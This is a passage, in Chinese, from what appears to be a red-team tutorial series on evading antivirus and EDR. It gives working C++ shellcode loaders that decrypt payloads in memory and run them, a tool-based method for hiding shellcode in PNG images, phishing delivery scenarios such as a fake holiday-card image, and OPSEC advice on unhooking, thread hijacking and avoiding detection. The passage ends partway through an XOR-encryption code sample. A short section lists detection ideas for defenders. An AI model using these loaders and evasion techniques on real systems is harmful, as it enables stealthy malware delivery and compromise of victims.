<h4 id="XOR解密例程："><a href="#XOR解密例程：" class="headerlink" title="XOR解密例程："></a>XOR解密例程：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">xor_decrypt</span><span class="hljs-params">(BYTE* buf, DWORD len, BYTE key)</span> &#123;<br>    <span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        buf[i] ^= key;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在<code>InternetReadFile</code>之后，执行之前调用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">xor_decrypt(buffer, bytesRead, <span class="hljs-number">0xAA</span>); <span class="hljs-comment">// XOR密钥</span><br></code></pre></td></tr></table></figure>

<hr>
<h3 id="5-检测规避技术"><a href="#5-检测规避技术" class="headerlink" title="5. 检测规避技术"></a><strong>5. 检测规避技术</strong></h3><table>
<thead>
<tr>
<th>规避机制</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>使用WinHttp API代替WinInet</td>
<td>EDR监控较少</td>
</tr>
<tr>
<td>混淆用户代理和头信息</td>
<td>避免启发式&#x2F;行为检测引擎的检测</td>
</tr>
<tr>
<td>避免静态URL</td>
<td>使用重定向器、pastebin或基于DNS的检索</td>
</tr>
<tr>
<td>使用加密的有效负载</td>
<td>隐藏真实意图，避开深度包检测（DPI）</td>
</tr>
<tr>
<td>内存执行</td>
<td>防止基于文件的AV扫描</td>
</tr>
</tbody></table>
<hr>
<h3 id="6-持久化层（可选）"><a href="#6-持久化层（可选）" class="headerlink" title="6. 持久化层（可选）"></a><strong>6. 持久化层（可选）</strong></h3><p>高级技术包括：</p>
<ul>
<li><p>从注入的DLL中调用此存根</p>
</li>
<li><p>使用LOLbins如<code>mshta</code>、<code>rundll32</code>或<code>Regsvr32</code>加载存根加载器</p>
</li>
<li><p>通过WMI、计划任务或注册表键进行分发</p>
</li>
</ul>
<hr>
<h3 id="7-支持的有效负载格式"><a href="#7-支持的有效负载格式" class="headerlink" title="7. 支持的有效负载格式"></a><strong>7. 支持的有效负载格式</strong></h3><p>你可以下载并执行以下类型的有效负载：</p>
<ul>
<li><p>Shellcode（二进制&#x2F;原始格式）</p>
</li>
<li><p>反射DLL</p>
</li>
<li><p>完整PE文件（如果你编写了自定义加载器）</p>
</li>
<li><p>脚本：PowerShell、JS、HTA、VBS（通过脚本主机执行）</p>
</li>
</ul>
<hr>
<h3 id="8-注意事项与建议"><a href="#8-注意事项与建议" class="headerlink" title="8. 注意事项与建议"></a><strong>8. 注意事项与建议</strong></h3><ul>
<li><p>使用<code>PAGE_EXECUTE_READWRITE</code>的<code>VirtualAlloc</code>会被高级EDR监控。建议在解密后使用<code>VirtualProtect</code>。</p>
</li>
<li><p>替换<code>InternetOpen</code> API，使用原始<code>WinHttpSendRequest</code>或甚至直接套接字连接以提高隐蔽性。</p>
</li>
<li><p>避免硬编码字符串。使用如字符串堆叠、编码或通过<code>GetProcAddress</code>动态生成API等技术。</p>
</li>
</ul>
<hr>
<h3 id="结论-3"><a href="#结论-3" class="headerlink" title="结论"></a><strong>结论</strong></h3><p>远程有效负载托管与无文件执行是现代攻击操作的基石。它允许：</p>
<ul>
<li><p>最小的取证足迹</p>
</li>
<li><p>绕过大多数基于磁盘的检测</p>
</li>
<li><p>动态修改有效负载以避免静态签名</p>
</li>
</ul>
<h2 id="AV-EDR规避实用技术-4-3-使用ImgPayload将有效负载隐藏在图像文件中"><a href="#AV-EDR规避实用技术-4-3-使用ImgPayload将有效负载隐藏在图像文件中" class="headerlink" title="AV&#x2F;EDR规避实用技术 - 4.3 - 使用ImgPayload将有效负载隐藏在图像文件中"></a>AV&#x2F;EDR规避实用技术 - 4.3 - 使用ImgPayload将有效负载隐藏在图像文件中</h2><h3 id="概述-3"><a href="#概述-3" class="headerlink" title="概述"></a><strong>概述</strong></h3><p>现代的AV&#x2F;EDR引擎扫描内存区域、磁盘文件和进程行为，查找已知的签名和启发式特征。一个常见的规避方法是将有效负载隐藏在看起来无害的文件中，如图像文件（PNG、JPG）。这允许通过以下方式传递有效负载：</p>
<ul>
<li><p>网络钓鱼附件</p>
</li>
<li><p>社会工程学</p>
</li>
<li><p>无文件投递器</p>
</li>
</ul>
<p>本模块介绍了使用<strong>隐写术或简单数据隐藏方法将shellcode嵌入图像</strong>的技术。我们将使用<a target="_blank" rel="noopener" href="https://github.com/CyberSecurityUP/ImgPayload">ImgPayload</a>工具，它是一个专门用来嵌入和提取图像文件中的shellcode的工具。</p>
<hr>
<h3 id="1-–-将Shellcode嵌入图像"><a href="#1-–-将Shellcode嵌入图像" class="headerlink" title="1 – 将Shellcode嵌入图像"></a><strong>1 – 将Shellcode嵌入图像</strong></h3><p>嵌入过程将一个原始的shellcode文件（例如，<code>payload.bin</code>）附加到一个<code>.png</code>图像文件中，同时保持图像的可视性。</p>
<h4 id="命令示例"><a href="#命令示例" class="headerlink" title="命令示例"></a><strong>命令示例</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 ImgPayload.py -m inject -i input.png -p payload.bin -o stego.png<br></code></pre></td></tr></table></figure>

<ul>
<li><p><code>-m inject</code>：嵌入有效负载的模式</p>
</li>
<li><p><code>-i input.png</code>：输入的承载图像</p>
</li>
<li><p><code>-p payload.bin</code>：二进制的shellcode有效负载</p>
</li>
<li><p><code>-o stego.png</code>：输出图像，包含嵌入的有效负载</p>
</li>
</ul>
<h4 id="工作原理（简述）"><a href="#工作原理（简述）" class="headerlink" title="工作原理（简述）"></a><strong>工作原理（简述）</strong></h4><ul>
<li><p>工具将图像读取为字节数据。</p>
</li>
<li><p>在添加有效负载之前，会添加一个已知的标记（如<code>b&quot;###SHELLCODE###&quot;</code>）。</p>
</li>
<li><p>图像仍然可以作为普通图像文件查看。</p>
</li>
<li><p>通过搜索标记，可以提取出有效负载。</p>
</li>
</ul>
<hr>
<h3 id="2-–-从图像中提取并在内存中执行有效负载（C-）"><a href="#2-–-从图像中提取并在内存中执行有效负载（C-）" class="headerlink" title="2 – 从图像中提取并在内存中执行有效负载（C++）"></a><strong>2 – 从图像中提取并在内存中执行有效负载（C++）</strong></h3><p>可以加载隐写图像，扫描标记提取有效负载，并通过典型的shellcode注入方式执行。</p>
<h4 id="提取并执行shellcode的C-代码示例"><a href="#提取并执行shellcode的C-代码示例" class="headerlink" title="提取并执行shellcode的C++代码示例"></a><strong>提取并执行shellcode的C++代码示例</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fstream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br><span class="hljs-comment">// ImgPayload使用的标记</span><br><span class="hljs-type">const</span> std::string marker = <span class="hljs-string">&quot;###SHELLCODE###&quot;</span>;<br><br><span class="hljs-comment">// 读取文件到缓冲区</span><br><span class="hljs-function">std::vector&lt;<span class="hljs-type">char</span>&gt; <span class="hljs-title">ReadFileToBuffer</span><span class="hljs-params">(<span class="hljs-type">const</span> std::string&amp; filename)</span> </span>&#123;<br>    <span class="hljs-function">std::ifstream <span class="hljs-title">file</span><span class="hljs-params">(filename, std::ios::binary)</span></span>;<br>    <span class="hljs-keyword">return</span> std::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt;((std::<span class="hljs-built_in">istreambuf_iterator</span>&lt;<span class="hljs-type">char</span>&gt;(file)),<br>                             std::<span class="hljs-built_in">istreambuf_iterator</span>&lt;<span class="hljs-type">char</span>&gt;());<br>&#125;<br><br><span class="hljs-comment">// 查找标记并返回shellcode的指针</span><br><span class="hljs-function"><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* <span class="hljs-title">FindShellcode</span><span class="hljs-params">(std::vector&lt;<span class="hljs-type">char</span>&gt;&amp; buffer, <span class="hljs-type">size_t</span>&amp; scSize)</span> </span>&#123;<br>    <span class="hljs-keyword">auto</span> it = std::<span class="hljs-built_in">search</span>(buffer.<span class="hljs-built_in">begin</span>(), buffer.<span class="hljs-built_in">end</span>(), marker.<span class="hljs-built_in">begin</span>(), marker.<span class="hljs-built_in">end</span>());<br>    <span class="hljs-keyword">if</span> (it == buffer.<span class="hljs-built_in">end</span>()) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;标记未找到&quot;</span> &lt;&lt; std::endl;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// Shellcode就在标记后面</span><br>    it += marker.<span class="hljs-built_in">size</span>();<br>    scSize = buffer.<span class="hljs-built_in">end</span>() - it;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*&gt;(&amp;(*it));<br>&#125;<br><br><span class="hljs-comment">// 使用CreateThread运行shellcode</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">RunShellcode</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* sc, <span class="hljs-type">size_t</span> size)</span> </span>&#123;<br>    <span class="hljs-type">void</span>* exec = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-number">0</span>, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(exec, sc, size);<br>    DWORD tid;<br>    HANDLE hThread = <span class="hljs-built_in">CreateThread</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)exec, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;tid);<br>    <span class="hljs-built_in">WaitForSingleObject</span>(hThread, INFINITE);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    std::vector&lt;<span class="hljs-type">char</span>&gt; imgBuffer = <span class="hljs-built_in">ReadFileToBuffer</span>(<span class="hljs-string">&quot;stego.png&quot;</span>);<br><br>    <span class="hljs-type">size_t</span> shellcodeSize = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* shellcode = <span class="hljs-built_in">FindShellcode</span>(imgBuffer, shellcodeSize);<br>    <span class="hljs-keyword">if</span> (shellcode) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;Shellcode大小: &quot;</span> &lt;&lt; shellcodeSize &lt;&lt; <span class="hljs-string">&quot; 字节&quot;</span> &lt;&lt; std::endl;<br>        <span class="hljs-built_in">RunShellcode</span>(shellcode, shellcodeSize);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="3-–-红队实战中的应用场景"><a href="#3-–-红队实战中的应用场景" class="headerlink" title="3 – 红队实战中的应用场景"></a><strong>3 – 红队实战中的应用场景</strong></h3><ul>
<li><p><strong>场景</strong>：钓鱼邮件附带<code>holiday_card.png</code>图像。</p>
</li>
<li><p>图像正常显示。</p>
</li>
<li><p>点击时，在自定义加载器中执行有效负载，直接在内存中运行。</p>
</li>
<li><p>防御者看到的仅是图像，而不是二进制文件或<code>.exe</code>。</p>
</li>
</ul>
<p>这种方法绕过了传统的静态文件检查和部分运行时保护。</p>
<hr>
<h3 id="4-–-检测与防御（蓝队视角）"><a href="#4-–-检测与防御（蓝队视角）" class="headerlink" title="4 – 检测与防御（蓝队视角）"></a><strong>4 – 检测与防御（蓝队视角）</strong></h3><p>尽管该方法有效，防御者可以通过以下方式检测：</p>
<ul>
<li><p>标记图像文件异常大的文件大小</p>
</li>
<li><p>扫描已知的有效负载标记（如<code>###SHELLCODE###</code>）</p>
</li>
<li><p>监控加载图像后随即的代码注入行为</p>
</li>
<li><p>使用YARA规则检测图像中带有二进制尾部的数据</p>
</li>
</ul>
<hr>
<h3 id="5-–-改进建议"><a href="#5-–-改进建议" class="headerlink" title="5 – 改进建议"></a><strong>5 – 改进建议</strong></h3><ul>
<li><p>在嵌入之前加密shellcode（见第5模块）</p>
</li>
<li><p>使用图像元数据（如<code>Exif</code>、<code>IDAT</code>等）而不是简单的附加数据</p>
</li>
<li><p>通过隐写解码逻辑触发有效负载</p>
</li>
</ul>
<hr>
<h3 id="6-高级应用场景"><a href="#6-高级应用场景" class="headerlink" title="6. 高级应用场景"></a><strong>6. 高级应用场景</strong></h3><table>
<thead>
<tr>
<th>应用场景</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>Discord或Slack传递</td>
<td>重命名为<code>.png</code>并通过聊天发送。大多数AV不会扫描它。</td>
</tr>
<tr>
<td>邮件附件</td>
<td>在签名图像或附件中嵌入有效负载。</td>
</tr>
<tr>
<td>动态C2</td>
<td>使用周期性获取的旋转隐写有效负载，从社交媒体或GitHub等平台获取。</td>
</tr>
</tbody></table>
<hr>
<h3 id="7-检测与防御规避"><a href="#7-检测与防御规避" class="headerlink" title="7. 检测与防御规避"></a><strong>7. 检测与防御规避</strong></h3><ul>
<li><p><strong>签名绕过</strong>：AV通常不会扫描PNG文件，除非特别配置。</p>
</li>
<li><p><strong>熵控制</strong>：嵌入过程可以保持熵，避免触发常见的检测机制。</p>
</li>
<li><p><strong>隐蔽性</strong>：与真实资产混合，尤其是在CDN或受信域名上托管时。</p>
</li>
</ul>
<hr>
<h3 id="8-真实世界的类似案例"><a href="#8-真实世界的类似案例" class="headerlink" title="8. 真实世界的类似案例"></a><strong>8. 真实世界的类似案例</strong></h3><ul>
<li><p><strong>APT32（OceanLotus）</strong>等团体使用过<code>.bmp</code>和<code>.ico</code>文件来传递有效负载。</p>
</li>
<li><p><strong>StegoDrop</strong>和<strong>ImgStego</strong>等工具也使用类似的概念。</p>
</li>
<li><p><strong>命令通道</strong>通过将加密的有效负载嵌入推特或Imgur上的迷因图像来传递。</p>
</li>
</ul>
<hr>
<h3 id="9-OPSEC注意事项"><a href="#9-OPSEC注意事项" class="headerlink" title="9. OPSEC注意事项"></a><strong>9. OPSEC注意事项</strong></h3><table>
<thead>
<tr>
<th>风险</th>
<th>缓解措施</th>
</tr>
</thead>
<tbody><tr>
<td>有效负载标记可见</td>
<td>在嵌入之前加密</td>
</tr>
<tr>
<td>AV沙盒打开图像</td>
<td>确保提取代码延迟或混淆</td>
</tr>
<tr>
<td>加载器的静态签名</td>
<td>编译时加入垃圾代码，重命名函数，或加密字符串</td>
</tr>
</tbody></table>
<hr>
<h3 id="10-与前面模块的结合使用"><a href="#10-与前面模块的结合使用" class="headerlink" title="10. 与前面模块的结合使用"></a><strong>10. 与前面模块的结合使用</strong></h3><ul>
<li><p>第2模块或第3模块中创建的有效负载可以作为输入使用。</p>
</li>
<li><p>可以结合第4.2模块（下载并执行）从远程获取图像。</p>
</li>
<li><p>与第5模块结合使用，在图像中嵌入加密的有效负载（嵌入前使用XOR或AES加密）。</p>
</li>
</ul>
<h2 id="AV-EDR规避实用技术-4-4-Shellcode传递与执行中的OPSEC技术"><a href="#AV-EDR规避实用技术-4-4-Shellcode传递与执行中的OPSEC技术" class="headerlink" title="AV&#x2F;EDR规避实用技术 - 4.4 - Shellcode传递与执行中的OPSEC技术"></a>AV&#x2F;EDR规避实用技术 - 4.4 - Shellcode传递与执行中的OPSEC技术</h2><p>旨在绕过EDR和AV的攻击者必须设计符合<strong>操作安全性（OPSEC）</strong>的有效负载。这意味着要最小化指示器，减少噪声，并避免在<strong>传递</strong>、<strong>解密</strong>和<strong>执行</strong>shellcode时常见的检测路径。</p>
<p>以下是应用于shellcode使用的核心OPSEC技术，附带解释、现实世界的类比和C++代码示例。</p>
<hr>
<h3 id="4-4-1-分阶段与无阶段有效负载"><a href="#4-4-1-分阶段与无阶段有效负载" class="headerlink" title="4.4.1 分阶段与无阶段有效负载"></a><strong>4.4.1 分阶段与无阶段有效负载</strong></h3><p><strong>分阶段有效负载</strong></p>
<ul>
<li><p>初始有效负载较小，负责获取第二阶段有效负载。</p>
</li>
<li><p>在C2框架（如Cobalt Strike）中常见。</p>
</li>
<li><p>较容易混淆，但由于网络可见性较大，存在一定风险。</p>
</li>
</ul>
<p><strong>无阶段有效负载</strong></p>
<ul>
<li><p>整个有效负载被嵌入。</p>
</li>
<li><p>较难传递，但审计更容易。</p>
</li>
</ul>
<p><strong>OPSEC决策</strong></p>
<ul>
<li><p>在受限或监控的环境中使用无阶段有效负载。</p>
</li>
<li><p>当初始访问向量受到大小限制时（例如，宏、LNK），使用分阶段有效负载。</p>
</li>
</ul>
<hr>
<h3 id="4-4-2-通过可疑与合法路径执行"><a href="#4-4-2-通过可疑与合法路径执行" class="headerlink" title="4.4.2 通过可疑与合法路径执行"></a><strong>4.4.2 通过可疑与合法路径执行</strong></h3><p>避免使用已知的高风险API，例如：</p>
<ul>
<li><p><code>CreateRemoteThreadEx</code></p>
</li>
<li><p><code>WriteProcessMemory</code></p>
</li>
<li><p><code>VirtualAllocEx</code></p>
</li>
</ul>
<p>使用更隐蔽的替代方法，如：</p>
<ul>
<li><p><code>NtCreateThreadEx</code></p>
</li>
<li><p><code>RtlCreateUserThread</code></p>
</li>
<li><p>手动映射</p>
</li>
<li><p>反射式DLL注入</p>
</li>
</ul>
<hr>
<h3 id="4-4-3-内存保护与RWX规避"><a href="#4-4-3-内存保护与RWX规避" class="headerlink" title="4.4.3 内存保护与RWX规避"></a><strong>4.4.3 内存保护与RWX规避</strong></h3><p><strong>AV&#x2F;EDRs监控的内容：</strong></p>
<ul>
<li><p>标记为<code>PAGE_EXECUTE_READWRITE</code>的内存</p>
</li>
<li><p>通常发生在<code>VirtualAlloc</code>和shellcode期间</p>
</li>
</ul>
<p><strong>OPSEC技术：</strong><br>在<code>PAGE_READWRITE</code>下分配内存，写入shellcode，然后通过<code>VirtualProtect</code>切换为<code>PAGE_EXECUTE_READ</code>。</p>
<p><strong>示例：</strong></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp">LPVOID p = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, payload_size, MEM_COMMIT, PAGE_READWRITE);<br><span class="hljs-built_in">memcpy</span>(p, payload, payload_size);<br><br><span class="hljs-comment">// 避免直接RWX内存，写入后切换为RX</span><br>DWORD oldProtect;<br><span class="hljs-built_in">VirtualProtect</span>(p, payload_size, PAGE_EXECUTE_READ, &amp;oldProtect);<br><br>((<span class="hljs-built_in">void</span>(*)())p)(); <span class="hljs-comment">// 执行</span><br></code></pre></td></tr></table></figure>

<hr>
<h3 id="4-4-4-反转转储与内存标记技术"><a href="#4-4-4-反转转储与内存标记技术" class="headerlink" title="4.4.4 反转转储与内存标记技术"></a><strong>4.4.4 反转转储与内存标记技术</strong></h3><ol>
<li><p><strong>在内存中加密shellcode</strong>，仅在执行时解密。</p>
</li>
<li><p><strong>自删除shellcode</strong>，执行后或将其移动到较少监控的内存区域（例如，堆）。</p>
</li>
<li><p>使用<strong>不可执行的段</strong>，如<code>.data</code>或隐藏的内存映射（<code>NtCreateSection</code>）。</p>
</li>
</ol>
<hr>
<h3 id="4-4-5-用户态解钩（可选）"><a href="#4-4-5-用户态解钩（可选）" class="headerlink" title="4.4.5 用户态解钩（可选）"></a><strong>4.4.5 用户态解钩（可选）</strong></h3><p>EDRs通常会挂钩<code>ntdll.dll</code>中的API。解钩技术包括：</p>
<ul>
<li><p>通过<code>LdrLoadDll</code>从磁盘重新加载干净的<code>ntdll.dll</code>。</p>
</li>
<li><p>在内存中覆盖<code>ntdll</code>的<code>.text</code>段。</p>
</li>
<li><p>系统调用存根（例如，Hell’s Gate、SysWhispers）。</p>
</li>
</ul>
<p><strong>注意：</strong> 不精确的解钩操作会增加被检测的概率。</p>
<hr>
<h3 id="4-4-6-使用间接调用和误导API链"><a href="#4-4-6-使用间接调用和误导API链" class="headerlink" title="4.4.6 使用间接调用和误导API链"></a><strong>4.4.6 使用间接调用和误导API链</strong></h3><p>EDRs会查找已知的调用模式。打破模式：</p>
<ul>
<li><p>混淆API导入（基于哈希的解析）。</p>
</li>
<li><p>使用间接调用gadgets（通过ROP&#x2F;内联gadget调用[reg]）。</p>
</li>
<li><p>链接无害的API（例如，<code>NtDelayExecution</code> → 系统调用）。</p>
</li>
</ul>
<hr>
<h3 id="4-4-7-线程上下文伪造"><a href="#4-4-7-线程上下文伪造" class="headerlink" title="4.4.7 线程上下文伪造"></a><strong>4.4.7 线程上下文伪造</strong></h3><p>伪造线程上下文以隐藏shellcode的来源：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp">CONTEXT ctx;<br>ctx.ContextFlags = CONTEXT_FULL;<br><span class="hljs-built_in">GetThreadContext</span>(hThread, &amp;ctx);<br><br><span class="hljs-comment">// 修改RIP指向shellcode（针对远程进程）</span><br>ctx.Rip = (DWORD64)shellcode_address;<br><span class="hljs-built_in">SetThreadContext</span>(hThread, &amp;ctx);<br></code></pre></td></tr></table></figure>

<p>这使得执行看起来比直接调用<code>CreateRemoteThread</code>更合法。</p>
<hr>
<h3 id="4-4-8-栈与堆伪造"><a href="#4-4-8-栈与堆伪造" class="headerlink" title="4.4.8 栈与堆伪造"></a><strong>4.4.8 栈与堆伪造</strong></h3><ul>
<li><p>分配虚假的栈（<code>VirtualAlloc</code>），在shellcode之前设置<code>ESP/RSP</code>。</p>
</li>
<li><p>用诱饵数据进行堆喷射。</p>
</li>
<li><p>如果需要，手动设置TEB&#x2F;PEB值以伪造线程来源。</p>
</li>
</ul>
<hr>
<h3 id="4-4-9-传递伪装"><a href="#4-4-9-传递伪装" class="headerlink" title="4.4.9 传递伪装"></a><strong>4.4.9 传递伪装</strong></h3><ul>
<li><p>通过<strong>图像加载器</strong>、<strong>多用途文件</strong>或<strong>加密数据块</strong>传递有效负载。</p>
</li>
<li><p>使用<strong>ImgPayload</strong>（您的工具）或LSB隐写术。</p>
</li>
<li><p>使用<strong>非标准格式</strong>：伪造字体、docx、剪贴板、备用数据流。</p>
</li>
</ul>
<hr>
<h3 id="4-4-10-避免已知指示器"><a href="#4-4-10-避免已知指示器" class="headerlink" title="4.4.10 避免已知指示器"></a><strong>4.4.10 避免已知指示器</strong></h3><ul>
<li><p>避免使用“calc.exe”、“cmd.exe”或已知的shellcode模式。</p>
</li>
<li><p>删除元数据。</p>
</li>
<li><p>使用熵填充或噪声注入，以避免基于签名的YARA规则。</p>
</li>
</ul>
<hr>
<p> <strong>真实世界OPSEC示例（内存规避加载器）</strong></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp">LPVOID mem = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, payload_len, MEM_COMMIT, PAGE_READWRITE);<br><span class="hljs-built_in">memcpy</span>(mem, encrypted_payload, payload_len);<br><br><span class="hljs-comment">// 在内存中解密（XOR）</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; payload_len; i++)<br>    ((BYTE*)mem)[i] ^= <span class="hljs-number">0x55</span>;<br><br><span class="hljs-comment">// 切换为可执行内存（但不是RWX）</span><br>DWORD oldProt;<br><span class="hljs-built_in">VirtualProtect</span>(mem, payload_len, PAGE_EXECUTE_READ, &amp;oldProt);<br><br><span class="hljs-comment">// 执行</span><br>((<span class="hljs-built_in">void</span>(*)())mem)();<br></code></pre></td></tr></table></figure>

<ul>
<li><p>有效负载在内存中解密。</p>
</li>
<li><p>内存从未被标记为RWX。</p>
</li>
<li><p>没有可疑的字符串或导入。</p>
</li>
</ul>
<h1 id="模块-5：有效载荷加密和混淆"><a href="#模块-5：有效载荷加密和混淆" class="headerlink" title="模块 5：有效载荷加密和混淆"></a>模块 5：有效载荷加密和混淆</h1><h2 id="AV-EDR规避实用技术-5-1-使用XOR加密进行Shellcode混淆"><a href="#AV-EDR规避实用技术-5-1-使用XOR加密进行Shellcode混淆" class="headerlink" title="AV&#x2F;EDR规避实用技术 - 5.1 - 使用XOR加密进行Shellcode混淆"></a>AV&#x2F;EDR规避实用技术 - 5.1 - 使用XOR加密进行Shellcode混淆</h2><h3 id="概述-4"><a href="#概述-4" class="headerlink" title="概述"></a><strong>概述</strong></h3><p><strong>XOR加密</strong>是一种轻量级的对称加密技术，用于<strong>混淆shellcode或有效负载</strong>，以绕过基于签名的检测系统，如AV和EDR。由于其简单性和对静态分析的有效性，它在恶意软件、加壳工具和红队工具中被广泛使用。</p>
<hr>
<h3 id="5-1-1-XOR加密的工作原理"><a href="#5-1-1-XOR加密的工作原理" class="headerlink" title="5.1.1 XOR加密的工作原理"></a><strong>5.1.1 XOR加密的工作原理</strong></h3><p>XOR（异或）操作符仅在输入不同的时候返回<code>true</code>：</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">A <span class="hljs-keyword">XOR</span> B = C<br>C <span class="hljs-keyword">XOR</span> B = A  // <span class="hljs-keyword">XOR</span>使用相同的密钥可逆<br></code></pre></td></tr></table></figure>

<p>这使得它成为简单加密的完美候选。</p>
<hr>
<h3 id="5-1-2-为什么使用XOR进行规避"><a href="#5-1-2-为什么使用XOR进行规避" class="headerlink" title="5.1.2 为什么使用XOR进行规避"></a><strong>5.1.2 为什么使用XOR进行规避</strong></h3><p>AV&#x2F;EDR工具通常会扫描以下内容：</p>
<ul>
<li><p>已知的<strong>二进制模式</strong></p>
</li>
<li><p><strong>系统调用存根</strong></p>
</li>
<li><p>常见的shellcode模板（例如，来自Metasploit）</p>
</li>
</ul>
<p>通过对有效负载进行XOR加密，这些模式会被隐藏，避免静态检测。执行需要<strong>运行时解密</strong>，可以在内存中执行前进行解密。</p>
<hr>
<h3 id="5-1-3-XOR加密在C-中的实现："><a href="#5-1-3-XOR加密在C-中的实现：" class="headerlink" title="5.1.3 XOR加密在C++中的实现："></a><strong>5.1.3 XOR加密在C++中的实现：</strong></h3><p>让我们实现一个简单的C++加载器，用于使用XOR加密和解密shellcode缓冲区。</p>
<h4 id="加密阶段（离线，交付前完成）"><a href="#加密阶段（离线，交付前完成）" class="headerlink" title="加密阶段（离线，交付前完成）"></a><strong>加密阶段（离线，交付前完成）</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    std::vector&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>&gt; shellcode = &#123;<br>        <span class="hljs-number">0xfc</span>, <span 